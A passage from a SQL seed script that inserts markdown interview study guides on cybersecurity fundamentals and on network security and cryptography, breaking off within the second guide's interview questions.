-- Batch 10: 10 notes
BEGIN;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part1_Cybersecurity_Fundamentals$VELSEC$, $VELSEC$Study Guide Part1 Cybersecurity Fundamentals$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 1: Cybersecurity Fundamentals & Core Concepts

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: CIA Triad, Cybersecurity vs InfoSec, Vulnerability/Threat/Risk, Zero-Day, Zero Trust, IAAA, Roles, Defense-in-Depth

---

## Table of Contents

1. [What is Cybersecurity?](#1-what-is-cybersecurity)
2. [The CIA Triad](#2-the-cia-triad)
3. [Cybersecurity vs Information Security](#3-cybersecurity-vs-information-security)
4. [Vulnerability, Threat, and Risk](#4-vulnerability-threat-and-risk)
5. [Zero-Day Vulnerabilities & Patches](#5-zero-day-vulnerabilities--patches)
6. [Zero Trust Security Model](#6-zero-trust-security-model)
7. [IAAA — Identification, Authentication, Authorization, Auditing, Accountability](#7-iaaa--identification-authentication-authorization-auditing-accountability)
8. [Security Analyst vs Security Engineer](#8-security-analyst-vs-security-engineer)
9. [Defense-in-Depth](#9-defense-in-depth)
10. [Interview Questions & Answers](#10-interview-questions--answers)
11. [Quick Reference Tables](#11-quick-reference-tables)
12. [Key Takeaways](#12-key-takeaways)

---

## 1. What is Cybersecurity?

Cybersecurity is the practice of **protecting systems, networks, and programs from digital attacks**. These attacks are usually aimed at:

- Accessing, changing, or destroying sensitive information
- Extorting money from users
- Interrupting normal business processes

Cybersecurity involves implementing **multiple layers of defense** across computers, networks, programs, and data. In an organization, people, processes, and technology must complement each other to create an effective defense.

---

## 2. The CIA Triad

The **CIA Triad** is the foundational model for information security. It consists of three core principles:

### Confidentiality
- Ensuring that information is **accessible only to authorized individuals**
- Achieved through: encryption, access controls, authentication mechanisms
- **Example:** Only HR personnel can access employee salary data

### Integrity
- Ensuring that data is **accurate, consistent, and unaltered** during storage and transit
- Achieved through: hashing, digital signatures, checksums, version control
- **Example:** Ensuring a financial transaction record hasn't been tampered with

### Availability
- Ensuring that systems, data, and resources are **accessible when needed** by authorized users
- Achieved through: redundancy, backups, disaster recovery, load balancing
- **Example:** An e-commerce website remains accessible during peak traffic

> **Interview Tip:** When asked "What is the CIA Triad?", always define all three components with real-world examples.

---

## 3. Cybersecurity vs Information Security

| Aspect | Cybersecurity | Information Security |
|--------|--------------|---------------------|
| **Scope** | Protects digital assets in cyberspace | Protects all forms of information (digital & physical) |
| **Focus** | Protection against cyber threats (hacking, malware) | Protection of data regardless of form |
| **Domain** | Digital/electronic systems only | Digital, physical, and verbal information |
| **Example** | Protecting a web server from DDoS | Ensuring paper files are locked in a cabinet |

> **Key Point:** Cybersecurity is a **subset** of Information Security. All cybersecurity is information security, but not all information security is cybersecurity.

---

## 4. Vulnerability, Threat, and Risk

### Vulnerability
- A **weakness or flaw** in a system, process, or design that can be exploited
- Examples: Unpatched software, weak passwords, misconfigured firewalls, open ports

### Threat
- A **potential cause of an unwanted incident** that could exploit a vulnerability and cause harm
- Examples: Hackers, malware, natural disasters, insider threats
- Threats can be **intentional** (hacker) or **unintentional** (accidental data deletion)

### Risk
- The **likelihood and impact** of a threat exploiting a vulnerability
- **Risk = Threat × Vulnerability × Impact**
- Example: An unpatched web server (vulnerability) + known exploit in the wild (threat) = HIGH risk

### Relationship Diagram
```
Threat ──exploits──> Vulnerability ──causes──> Risk ──leads to──> Impact
```

> **Interview Tip:** Always explain the relationship between these three. Risk is the business concern; vulnerability is the technical issue; threat is the actor or event.

---

## 5. Zero-Day Vulnerabilities & Patches

### Zero-Day Vulnerability
- A vulnerability that is **unknown to the vendor** and has **no patch available**
- Called "zero-day" because the vendor has had **zero days** to fix it
- Extremely dangerous because there is no known defense

### Types of Patches

| Patch Type | Description |
|-----------|-------------|
| **Hotfix** | A quick, urgent fix for a critical vulnerability — applied immediately |
| **Patch** | A standard update that addresses one or more known vulnerabilities |
| **Service Pack** | A collection of multiple patches and updates bundled together |

### Best Practices for Patch Management
1. Maintain an inventory of all systems and software
2. Prioritize patches based on risk and criticality
3. Test patches in a staging environment before deployment
4. Deploy patches in a timely manner
5. Verify successful patch installation
6. Document all patch activities

---

## 6. Zero Trust Security Model

### Core Principle
> **"Never trust, always verify"**

Zero Trust assumes that **no user, device, or network** should be automatically trusted, whether inside or outside the organization's network perimeter.

### Key Principles of Zero Trust:
1. **Verify explicitly** — Always authenticate and authorize based on all available data points
2. **Use least privilege access** — Limit user access to only what is needed
3. **Assume breach** — Minimize blast radius and segment access; verify end-to-end encryption

### Components of Zero Trust:
- **Identity verification** — Multi-factor authentication for all users
- **Micro-segmentation** — Divide the network into small zones
- **Least privilege** — Grant minimum necessary permissions
- **Continuous monitoring** — Monitor all network traffic and user behavior
- **Device trust** — Verify the health and compliance of devices

### Zero Trust vs Traditional Security

| Aspect | Traditional (Castle-and-Moat) | Zero Trust |
|--------|------------------------------|------------|
| Trust model | Trust everything inside the perimeter | Trust nothing, verify everything |
| Perimeter | Strong perimeter, soft interior | No defined perimeter |
| Access | Broad access once inside | Granular, least-privilege access |
| Verification | At entry point only | Continuous verification |

---

## 7. IAAA — Identification, Authentication, Authorization, Auditing, Accountability

IAAA represents the **Access Control Concepts** that govern security:

### Step 1: Identification
- **Establishing who you are** — the ability to identify a user
- Examples: Username, email ID, account number, process ID
- Identity is usually **public** information (e.g., your email address)
- Identity should be **unique** (except admin accounts)

### Step 2: Authentication
- **Verifying the claimed identity** — proving you are who you claim to be
- Authentication Types:

| Type | Description | Examples |
|------|-------------|---------|
| **Type 1: Something you know** | Knowledge-based | Password, PIN, passphrase |
| **Type 2: Something you have** | Possession-based | Access card, token, smart card |
| **Type 3: Something you are** | Biometrics | Fingerprint, retina scan, iris scan |
| **Type 4: Where you are** | Location-based | Office network, specific country |

#### Single Factor vs Multi-Factor Authentication
- **SFA (Single Factor):** Uses only ONE type (e.g., just a password)
- **MFA (Multi-Factor):** Uses TWO or MORE **different types** (e.g., password + token)
- ⚠️ Using password + PIN is **NOT** MFA because both are Type 1
- MFA is the **strongest** form of authentication

### Step 3: Authorization
- **Determining what the authenticated user can do**
- Defines rights and permissions assigned to subjects
- Happens AFTER authentication
- Implemented using Access Control Models (MAC, RBAC, DAC, ABAC)
- **Example:** You can board a flight (authenticated), but you can only sit in your assigned seat, not the cockpit (authorized)

### Step 4: Auditing
- **Monitoring and recording actions** taken by authenticated users
- Records events in **log files**
- Purpose: Establish accountability, detect malicious activity, validate compliance
- Collects logs from: user actions, system events, application activities, OS events

### Step 5: Accountability
- **Holding individuals responsible** for their actions
- Achieved by reviewing audit logs
- Ensures every information asset is **owned** and every action is **traceable**
- Enables **non-repudiation** — users cannot deny their actions because evidence exists

### IAAA Flow
```
Identification → Authentication → Authorization → Auditing → Accountability
                                                                    ↓
                                                            Non-Repudiation
```

---

## 8. Security Analyst vs Security Engineer

| Aspect | Security Analyst | Security Engineer |
|--------|-----------------|------------------|
| **Primary Role** | Monitor, detect, and respond to security threats | Design, build, and maintain security infrastructure |
| **Focus** | Reactive — responding to incidents | Proactive — building defenses |
| **Daily Tasks** | Monitor SIEM alerts, investigate incidents, triage alerts | Configure firewalls, deploy security tools, architect solutions |
| **Tools Used** | SIEM, EDR, SOAR, ticketing systems | Firewalls, IDS/IPS, network security tools |
| **Skills** | Log analysis, threat intelligence, incident response | Networking, scripting, system administration |
| **Certifications** | CompTIA Security+, CySA+, CEH | CISSP, CCNP Security, cloud certs |

> **Key Insight:** An analyst is like a **security guard** watching cameras, while an engineer is the **architect** who designed the building's security system.

---

## 9. Defense-in-Depth

### What is Defense-in-Depth?
A security strategy that employs **multiple layers of security measures** based on the principle that no single security measure can provide complete protection. Also known as:
- **Layered Defense** — uses multiple layers
- **Castle Approach** — draws analogy to fortified castles
- **Defense in Breadth** — emphasizes broad coverage

### The 7 Layers of Defense-in-Depth

#### Layer 1: Data Layer
- Protects sensitive and critical data
- Measures: Data classification, encryption (at rest & in transit), access controls, DLP (Data Loss Prevention), backup & recovery, secure data storage, data monitoring & auditing

#### Layer 2: Application Layer
- Secures software applications
- Measures: Secure SDLC, input validation, authentication & authorization, session management, error handling, secure configuration, security testing

#### Layer 3: Host Layer
- Secures individual endpoints (servers, workstations)
- Measures: Endpoint protection (AV/AM), patch management, host-based firewalls, strong authentication, privilege management, disk encryption, application whitelisting, continuous monitoring

#### Layer 4: Internal Network
- Protects the internal network infrastructure
- Measures: Network segmentation (VLANs, SDN), access control lists, NAC, network monitoring, secure remote access (VPN)

#### Layer 5: Perimeter
- Protects the boundary between internal and external networks
- Measures: Firewalls (stateful + NGFW), IDS/IPS, DMZ, secure gateways (web & email), WAF

#### Layer 6: Physical Security
- Protects physical assets and infrastructure
- Measures: Fences/gates/walls, access cards/biometrics, surveillance cameras, security guards, data center security, secure disposal, emergency preparedness

#### Layer 7: Policies, Procedures & Awareness
- Establishes security governance
- Measures: Risk assessment, security policies (acceptable use, access control, data handling, IR), employee training, compliance monitoring, continuous improvement

### Defense-in-Depth Summary Table

| Layer | Focus | Example Controls |
|-------|-------|-----------------|
| Data | Information protection | Encryption, DLP, backups |
| Application | Software security | Input validation, secure SDLC |
| Host | Endpoint security | AV, patching, firewalls |
| Internal Network | Internal traffic | Segmentation, NAC, monitoring |
| Perimeter | Boundary protection | Firewalls, IDS/IPS, DMZ |
| Physical | Facility security | Cameras, locks, guards |
| Policies/Awareness | Governance | Policies, training, audits |

---

## 10. Interview Questions & Answers

### Q1: What is the CIA Triad?
**A:** The CIA Triad stands for Confidentiality, Integrity, and Availability. Confidentiality ensures data is accessible only to authorized users (via encryption, access controls). Integrity ensures data hasn't been tampered with (via hashing, digital signatures). Availability ensures systems are accessible when needed (via redundancy, backups).

### Q2: What is the difference between a vulnerability, a threat, and a risk?
**A:** A vulnerability is a weakness in a system (e.g., unpatched software). A threat is anything that can exploit a vulnerability (e.g., a hacker). Risk is the potential for loss when a threat exploits a vulnerability. Risk = Threat × Vulnerability × Impact.

### Q3: What is a Zero-Day vulnerability?
**A:** A zero-day vulnerability is a security flaw unknown to the software vendor with no available patch. It's called "zero-day" because the vendor has had zero days to address it. These are extremely dangerous because there's no known defense until a patch is developed.

### Q4: Explain the Zero Trust model.
**A:** Zero Trust operates on the principle of "never trust, always verify." It assumes no user, device, or network should be trusted by default. Key principles include: verify explicitly (always authenticate), use least privilege access, and assume breach. This contrasts with traditional perimeter-based security where anything inside the network is trusted.

### Q5: What is IAAA in cybersecurity?
**A:** IAAA stands for Identification (who you are — username), Authentication (proving identity — password/MFA), Authorization (what you can do — permissions), Auditing (recording actions — logs), and Accountability (holding users responsible — reviewing logs). Together, they enable non-repudiation.

### Q6: What is Multi-Factor Authentication (MFA)?
**A:** MFA requires two or more authentication types from DIFFERENT categories: something you know (password), something you have (token), something you are (biometrics), or somewhere you are (location). Using two factors from the same type (e.g., password + PIN) is NOT MFA. MFA is the strongest form of authentication.

### Q7: Explain Defense-in-Depth.
**A:** Defense-in-Depth is a layered security strategy where multiple security controls are implemented at different layers — data, application, host, internal network, perimeter, physical, and policies. The concept is that if one layer fails, the next layer provides protection. It originated from military strategy of fortifying castles with multiple defensive layers.

### Q8: What is the difference between a Security Analyst and a Security Engineer?
**A:** A Security Analyst focuses on monitoring, detecting, and responding to security incidents (reactive role). They use tools like SIEM and EDR. A Security Engineer focuses on designing, building, and maintaining security infrastructure (proactive role). They configure firewalls, architect security solutions, and deploy security tools.

### Q9: What is a hotfix vs a patch vs a service pack?
**A:** A hotfix is an urgent, quick fix for a critical vulnerability applied immediately. A patch is a standard update addressing one or more known vulnerabilities. A service pack is a collection of multiple patches and updates bundled together into a single installation.

### Q10: Why is accountability important in access control?
**A:** Accountability ensures that every action on a system can be traced back to a specific individual. It's achieved through auditing (logging actions) and reviewing those logs. It ensures non-repudiation — users cannot deny their actions because evidence exists. Accountability is essential for enforcing security policies and detecting malicious activity.

---

## 11. Quick Reference Tables

### Authentication Types at a Glance

| Type | Category | Examples |
|------|----------|---------|
| Type 1 | Something you **know** | Password, PIN, passphrase |
| Type 2 | Something you **have** | Smart card, token, access card |
| Type 3 | Something you **are** | Fingerprint, retina, iris, facial |
| Type 4 | Where you **are** | GPS location, office network |

### Security Model Comparison

| Model | Trust Basis | Perimeter | Verification |
|-------|------------|-----------|--------------|
| Traditional | Inside = trusted | Strong perimeter | At entry only |
| Zero Trust | Nothing trusted | No perimeter | Continuous |
| Defense-in-Depth | Layered controls | Multiple layers | At every layer |

### Patch Types

| Type | Urgency | Scope | Use Case |
|------|---------|-------|----------|
| Hotfix | Critical/Immediate | Single issue | Active exploit |
| Patch | Standard | One or more issues | Regular updates |
| Service Pack | Planned | Multiple patches | Major updates |

---

## 12. Key Takeaways

1. ✅ **CIA Triad** is the foundation — Confidentiality, Integrity, Availability
2. ✅ **Cybersecurity ⊂ Information Security** — cybersecurity is a subset
3. ✅ **Risk = Threat × Vulnerability × Impact** — understand the relationship
4. ✅ **Zero-Day** = Unknown vulnerability with NO patch available
5. ✅ **Zero Trust** = "Never trust, always verify" — no implicit trust
6. ✅ **IAAA** = Identification → Authentication → Authorization → Auditing → Accountability
7. ✅ **MFA** requires different TYPE categories (not just two passwords)
8. ✅ **Defense-in-Depth** = 7 layers of security controls
9. ✅ **Analyst = Monitor & Respond** | **Engineer = Design & Build**
10. ✅ **Non-repudiation** is achieved through IAAA — users can't deny actions

---

> 📌 **Next:** [Part 2: Network Security & Cryptography](./Study_Guide_Part2_Network_Security_Cryptography.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part2_Network_Security_Cryptography$VELSEC$, $VELSEC$Study Guide Part2 Network Security Cryptography$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 2: Network Security & Cryptography

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: OSI Model, TCP/IP, DNS, DHCP, Symmetric/Asymmetric Encryption, Hashing, Digital Signatures, PKI, IPSec, Firewalls

---

## Table of Contents

1. [Networking Fundamentals](#1-networking-fundamentals)
2. [Cryptography — Symmetric Encryption](#2-cryptography--symmetric-encryption)
3. [Cryptography — Asymmetric Encryption](#3-cryptography--asymmetric-encryption)
4. [Hashing](#4-hashing)
5. [Digital Signatures](#5-digital-signatures)
6. [Digital Certificates & PKI](#6-digital-certificates--pki)
7. [IPSec — Internet Protocol Security](#7-ipsec--internet-protocol-security)
8. [Firewall Types](#8-firewall-types)
9. [Interview Questions & Answers](#9-interview-questions--answers)
10. [Quick Reference Tables](#10-quick-reference-tables)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. Networking Fundamentals

### The OSI Model (7 Layers)

| Layer | Name | Function | Protocols/Devices | Data Unit |
|-------|------|----------|-------------------|-----------|
| 7 | **Application** | User interface & network services | HTTP, FTP, SMTP, DNS | Data |
| 6 | **Presentation** | Data formatting, encryption, compression | SSL/TLS, JPEG, ASCII | Data |
| 5 | **Session** | Session management & synchronization | NetBIOS, PPTP | Data |
| 4 | **Transport** | End-to-end delivery, flow control | TCP, UDP | Segment |
| 3 | **Network** | Logical addressing & routing | IP, ICMP, ARP | Packet |
| 2 | **Data Link** | Physical addressing & framing | Ethernet, MAC, switches | Frame |
| 1 | **Physical** | Physical transmission of bits | Cables, hubs, repeaters | Bits |

> **Mnemonic (Top-Down):** All People Seem To Need Data Processing  
> **Mnemonic (Bottom-Up):** Please Do Not Throw Sausage Pizza Away

### TCP vs UDP

| Feature | TCP | UDP |
|---------|-----|-----|
| **Connection** | Connection-oriented (3-way handshake) | Connectionless |
| **Reliability** | Reliable — guaranteed delivery | Unreliable — no guarantee |
| **Speed** | Slower (overhead for reliability) | Faster (minimal overhead) |
| **Order** | Maintains order of packets | No ordering guarantee |
| **Use Cases** | Web browsing, email, file transfer | Streaming, DNS, VoIP, gaming |
| **Header Size** | 20 bytes | 8 bytes |
| **Error Checking** | Yes — retransmission on error | Basic checksum only |

### TCP Three-Way Handshake
```
Client ──SYN──────────> Server
Client <──SYN-ACK────── Server
Client ──ACK──────────> Server
        Connection Established!
```

### Hub vs Switch vs Router

| Device | OSI Layer | Function | Broadcast Domain | Collision Domain |
|--------|-----------|----------|------------------|------------------|
| **Hub** | Layer 1 | Broadcasts data to all ports; inefficient and outdated | 1 | 1 (shared) |
| **Switch** | Layer 2 | Uses MAC addresses to forward data to specific ports | 1 | Per port |
| **Router** | Layer 3 | Routes packets between different networks using IP | Per port | Per port |

### Core Networking Concepts

- **MAC Address (Media Access Control):** A unique 48-bit (6-byte) hardware address assigned to a network interface (e.g., `00:1A:2B:3C:4D:5E`). The first 24 bits represent the manufacturer (OUI). Operates at Layer 2.
- **ARP (Address Resolution Protocol):** Resolves an IP address (Layer 3) to a MAC address (Layer 2) on a local network using broadcast requests.
- **ICMP (Internet Control Message Protocol):** Used for error reporting and network diagnostics (e.g., Ping uses ICMP Echo Request/Reply, TTL). Operates at Layer 3.
- **NAT (Network Address Translation):** Modifies IP address information in packet headers. Allows multiple devices on a private network to share a single public IP address, conserving IPv4 addresses and adding a layer of security. **PAT (Port Address Translation)** uses different source ports to map multiple internal devices to one external IP.

### Key Networking Protocols

| Protocol | Port | Purpose |
|----------|------|---------|
| **HTTP** | 80 | Web browsing (unencrypted) |
| **HTTPS** | 443 | Web browsing (encrypted with TLS) |
| **DNS** | 53 | Domain name to IP resolution |
| **DHCP** | 67/68 | Automatic IP address assignment |
| **FTP** | 20/21 | File transfer |
| **SSH** | 22 | Secure remote access |
| **Telnet** | 23 | Remote access (unencrypted — insecure) |
| **SMTP** | 25 | Sending email |
| **RDP** | 3389 | Remote desktop |
| **SNMP** | 161/162 | Network management |

### DNS (Domain Name System)
- Translates **domain names** (e.g., google.com) into **IP addresses** (e.g., 1.2.3.4)
- Acts like the **phone book of the internet**
- DNS Resolution Process: Query → Recursive Resolver → Root Server → TLD Server → Authoritative Server

### DHCP (Dynamic Host Configuration Protocol)
- Automatically assigns **IP addresses** and network configuration to devices
- Process: **DORA** — Discover → Offer → Request → Acknowledge

---

## 2. Cryptography — Symmetric Encryption

### What is Symmetric Encryption?
- Uses **one single key** for both encryption and decryption
- The same key must be shared between sender and receiver
- Also called **shared key** or **secret key** encryption

### How it Works
```
Plaintext ──[Encrypt with Key A]──> Ciphertext ──[Decrypt with Key A]──> Plaintext
```

### Common Symmetric Algorithms

| Algorithm | Key Size | Block Size | Status |
|-----------|----------|------------|--------|
| **AES** (Advanced Encryption Standard) | 128, 192, 256 bits | 128 bits | ✅ Current standard — most widely used |
| **DES** (Data Encryption Standard) | 56 bits | 64 bits | ❌ Deprecated — too weak |
| **3DES** (Triple DES) | 168 bits (effective 112) | 64 bits | ⚠️ Legacy — being phased out |
| **Blowfish** | 32-448 bits | 64 bits | ⚠️ Older, replaced by Twofish |
| **RC4** | 40-2048 bits | Stream cipher | ❌ Insecure — deprecated |

### Advantages & Disadvantages

| Advantages | Disadvantages |
|-----------|---------------|
| ✅ Very fast performance | ❌ Key distribution problem |
| ✅ Efficient for large data | ❌ Does NOT provide non-repudiation |
| ✅ Less computational overhead | ❌ Key management scales poorly (n users = n(n-1)/2 keys) |

---

## 3. Cryptography — Asymmetric Encryption

### What is Asymmetric Encryption?
- Uses a **key pair**: one **public key** (shared with everyone) and one **private key** (kept secret)
- Also called **public key cryptography**
- If you encrypt with the public key, only the private key can decrypt (and vice versa)

### How it Works
```
Encryption for Confidentiality:
Plaintext ──[Encrypt with Receiver's PUBLIC key]──> Ciphertext ──[Decrypt with Receiver's PRIVATE key]──> Plaintext

Digital Signature for Authentication:
Message ──[Sign with Sender's PRIVATE key]──> Signed Message ──[Verify with Sender's PUBLIC key]──> Verified
```

### Common Asymmetric Algorithms

| Algorithm | Use Case | Key Size | Notes |
|-----------|----------|----------|-------|
| **RSA** | Encryption, digital signatures | 1024-4096 bits | Most widely used |
| **Diffie-Hellman** | Key exchange | Variable | Used to securely exchange keys |
| **ECC** (Elliptic Curve) | Encryption, signatures | 256-384 bits | Stronger security with smaller keys |
| **DSA** (Digital Signature Algorithm) | Digital signatures only | 1024-3072 bits | Cannot encrypt data |
| **ElGamal** | Encryption, signatures | Variable | Based on Diffie-Hellman |

### Advantages & Disadvantages

| Advantages | Disadvantages |
|-----------|---------------|
| ✅ No key distribution problem | ❌ Much slower than symmetric |
| ✅ Provides non-repudiation | ❌ Computationally expensive |
| ✅ Enables digital signatures | ❌ Not practical for large data |
| ✅ Key management scales well | ❌ Requires PKI infrastructure |

### Symmetric vs Asymmetric — Comparison

| Feature | Symmetric | Asymmetric |
|---------|-----------|------------|
| Keys | One shared key | Key pair (public + private) |
| Speed | Fast | Slow |
| Key distribution | Difficult (must share securely) | Easy (public key is public) |
| Use case | Bulk data encryption | Key exchange, digital signatures |
| Non-repudiation | No | Yes |
| Scalability | Poor (many keys needed) | Good (2 keys per user) |
| Examples | AES, DES, 3DES | RSA, ECC, Diffie-Hellman |

> **Real-World Usage:** Most systems use BOTH — asymmetric to exchange a symmetric key, then symmetric for fast data encryption. This is called a **hybrid approach** (used in TLS/HTTPS).

---

## 4. Hashing

### What is Hashing?
- A **one-way function** that converts data into a **fixed-length string** (hash/digest)
- **Cannot be reversed** — you cannot derive the original data from the hash
- Used for **integrity verification**, NOT encryption

### Properties of Good Hash Functions
1. **Deterministic** — Same input always produces same output
2. **Fixed output length** — Regardless of input size
3. **Avalanche effect** — Small input change = drastically different hash
4. **Collision resistant** — Different inputs should not produce same hash
5. **Pre-image resistant** — Cannot derive input from hash
6. **Fast computation** — Quick to calculate

### Common Hashing Algorithms

| Algorithm | Output Size | Status |
|-----------|------------|--------|
| **MD5** | 128 bits | ❌ Broken — collision vulnerabilities |
| **SHA-1** | 160 bits | ❌ Deprecated — collision attacks found |
| **SHA-256** | 256 bits | ✅ Widely used — part of SHA-2 family |
| **SHA-512** | 512 bits | ✅ Stronger SHA-2 variant |
| **SHA-3** | Variable | ✅ Newest standard (Keccak) |
| **bcrypt** | 184 bits | ✅ Designed for password hashing |

### Hash Use Cases
- **Password storage** — Store hash of password, not the password itself
- **File integrity** — Verify downloads haven't been tampered with
- **Digital signatures** — Hash the message before signing
- **Forensics** — Verify evidence hasn't been altered

### Salting
- **Salt** = A random value added to data before hashing
- Prevents rainbow table attacks and pre-computed hash attacks
- Each user gets a **unique salt**, so identical passwords produce different hashes

```
Without Salt: hash("password123") = abc123 (same for all users)
With Salt:    hash("password123" + "x7kP9") = def456 (unique per user)
```

---

## 5. Digital Signatures

### What is a Digital Signature?
- An electronic signature that uses **asymmetric cryptography** to verify:
  - **Authentication** — Confirms the sender's identity
  - **Integrity** — Confirms the message wasn't altered
  - **Non-repudiation** — Sender cannot deny sending the message

### How Digital Signatures Work

```
Signing Process:
1. Sender creates a HASH of the message
2. Sender ENCRYPTS the hash with their PRIVATE key → Digital Signature
3. Sender attaches the Digital Signature to the message
4. Sends message + digital signature to receiver

Verification Process:
1. Receiver DECRYPTS the signature with sender's PUBLIC key → Original Hash
2. Receiver independently HASHES the received message → New Hash
3. If Original Hash == New Hash → Signature is VALID ✅
4. If they don't match → Message was TAMPERED ❌
```

### Key Points
- **Private key** = Used to SIGN (create signature)
- **Public key** = Used to VERIFY (validate signature)
- Provides **non-repudiation** because only the sender has the private key
- Used in: Software distribution, financial transactions, legal documents, email (S/MIME)

---

## 6. Digital Certificates & PKI

### What is PKI (Public Key Infrastructure)?
- The **underlying framework** that enables entities to securely exchange information using **digital certificates**
- Establishes trust between parties that are previously unknown to each other
- Analogous to **passports/driver's licenses** — a trusted third party vouches for your identity

### Key Components of PKI

| Component | Role |
|-----------|------|
| **CA (Certificate Authority)** | Verifies identities, issues and revokes digital certificates (like a government issuing passports) |
| **RA (Registration Authority)** | Assists CA in verifying identity; does NOT issue certificates |
| **Digital Certificate** | Contains entity's public key + identity info, signed by CA |
| **CRL (Certificate Revocation List)** | List of revoked certificate serial numbers |
| **OCSP (Online Certificate Status Protocol)** | Real-time certificate status checking |

### Digital Certificate Contents
- Entity's **public key**
- Entity's **identifying information** (name, server name, email)
- **CA's digital signature** (signed with CA's private key)
- **Expiry date**
- Uses **X.509 standard**

### Certificate Issuance Process
```
1. Requester creates a CSR (Certificate Signing Request)
   - Contains: requester's details + requester's public key
2. Requester sends CSR to Certificate Authority (CA)
3. CA verifies the requester's identity
4. CA creates the digital certificate:
   - Takes requester's public key + identity info
   - Puts it in X.509 format
   - Signs it with CA's PRIVATE key
5. CA gives the signed certificate to the requester
6. Requester distributes the certificate to users
```

### Certificate Revocation Methods

| Method | Description | Pros | Cons |
|--------|-------------|------|------|
| **CRL** | List of revoked certificate serial numbers | Simple | Time delay, bandwidth heavy |
| **OCSP** | Real-time status query (valid/invalid/unknown) | Real-time | More complex |

### Examples of Certificate Authorities
- DigiCert, GoDaddy, Let's Encrypt, Comodo, GlobalSign

---

## 7. IPSec — Internet Protocol Security

### What is IPSec?
- A comprehensive **suite of protocols** to secure communication over IP networks
- Provides: **Confidentiality** (encryption), **Integrity** (tamper detection), **Authenticity** (identity verification)
- Operates at **Layer 3 (Network Layer)** of the OSI model

### IPSec Components

| Component | Function |
|-----------|----------|
| **AH (Authentication Header)** | Provides integrity and authentication; does NOT encrypt data |
| **ESP (Encapsulating Security Payload)** | Provides confidentiality, integrity, AND authentication; encrypts data |
| **SA (Security Association)** | Defines security parameters (algorithms, keys) for a connection |
| **IKE (Internet Key Exchange)** | Negotiates and establishes SAs; handles key management |
| **SPD (Security Policy Database)** | Defines which traffic should be protected and how |
| **SAD (Security Association Database)** | Stores active SAs and their parameters |

### IPSec Modes

| Feature | Transport Mode | Tunnel Mode |
|---------|---------------|-------------|
| **What's encrypted** | Only the payload (data) | Entire original IP packet |
| **IP Header** | Original IP header preserved | New IP header added |
| **Use Case** | Host-to-host communication | Network-to-network (VPN) |
| **Typical Scenario** | Direct communication between two endpoints | Site-to-site VPN, remote access VPN |
| **Security Level** | Moderate | Higher (entire packet encrypted) |

### IPSec Use Cases
- **Remote Access VPNs** — Employees connecting securely from remote locations
- **Site-to-Site VPNs** — Branch offices connected to corporate network
- **Data Protection** — Encrypting sensitive data in transit (healthcare, finance)
- **Secure VoIP** — Protecting voice communications
- **Data Center Security** — Securing inter-server communication
- **IoT Security** — Securing IoT device communications
- **Cloud Connectivity** — Secure link between on-premise and cloud

### AH vs ESP Comparison

| Feature | AH | ESP |
|---------|-----|-----|
| Confidentiality (Encryption) | ❌ No | ✅ Yes |
| Integrity | ✅ Yes | ✅ Yes |
| Authentication | ✅ Yes | ✅ Yes |
| Anti-replay | ✅ Yes | ✅ Yes |
| IP Header protection | ✅ Yes (entire packet) | ❌ No (only payload) |

---

## 8. Firewall Types

### What is a Firewall?
A network security device or software that **monitors, filters, and controls** incoming and outgoing network traffic based on predefined security rules. Acts as a barrier between **trusted internal** and **untrusted external** networks.

### Types of Firewalls

#### 1. Packet Filtering Firewall
- Operates at **Layer 3 (Network)**
- Inspects **packet headers** (source/destination IP, ports, protocol)
- Uses **ACLs (Access Control Lists)** to allow/block traffic
- **Most basic** type; fast but limited
- **Stateless** — doesn't track connection state
- ⚠️ Vulnerable to IP spoofing

#### 2. Stateful Inspection Firewall
- Operates at **Layer 3 & 4 (Network + Transport)**
- Maintains a **state table** tracking active connections
- Makes **context-aware** decisions based on connection state
- More secure than packet filtering — can prevent IP spoofing
- Dynamically adapts rules based on connection state
- ⚠️ Slightly slower due to state tracking overhead

#### 3. Proxy Firewall (Application Layer Firewall)
- Operates at **Layer 7 (Application)**
- Acts as an **intermediary** between client and server
- Performs **deep packet inspection** at the application level
- Can inspect content, not just headers
- Provides content filtering, URL filtering, caching
- ⚠️ Significant performance overhead; can be a bottleneck

#### 4. Next-Generation Firewall (NGFW)
- Combines **stateful inspection + deep packet inspection + additional features**
- Includes: Application awareness, IPS, threat intelligence, SSL inspection
- Can identify and control applications regardless of port
- Advanced threat protection with sandboxing
- **Most comprehensive** firewall type

#### 5. Web Application Firewall (WAF)
- Specifically protects **web applications**
- Operates at **Layer 7** — focuses on HTTP/HTTPS traffic
- Protects against: SQL injection, XSS, CSRF, and other web attacks
- Can be deployed in front of web servers

### Firewall Types Comparison

| Type | OSI Layer | State Awareness | Content Inspection | Speed | Security Level |
|------|-----------|----------------|-------------------|-------|----------------|
| Packet Filtering | Layer 3 | Stateless | Headers only | Fastest | Basic |
| Stateful Inspection | Layer 3-4 | Stateful | Headers + state | Fast | Moderate |
| Proxy | Layer 7 | Stateful | Full content | Slowest | High |
| NGFW | Layer 3-7 | Stateful | Full + app-aware | Moderate | Highest |
| WAF | Layer 7 | Stateful | HTTP/HTTPS content | Moderate | High (web only) |

---

## 9. Interview Questions & Answers

### Q1: What is the difference between symmetric and asymmetric encryption?
**A:** Symmetric encryption uses ONE shared key for both encryption and decryption — it's fast but has a key distribution problem. Asymmetric uses a key PAIR (public + private) — it's slower but solves key distribution. In practice, both are used together: asymmetric for key exchange, symmetric for data encryption (hybrid approach used in TLS).

### Q2: What is hashing and how is it different from encryption?
**A:** Hashing is a one-way function that converts data into a fixed-length string and CANNOT be reversed. Encryption is a two-way process where data can be encrypted and then decrypted back. Hashing is used for integrity verification (e.g., password storage), while encryption is used for confidentiality (e.g., securing data in transit).

### Q3: What is PKI?
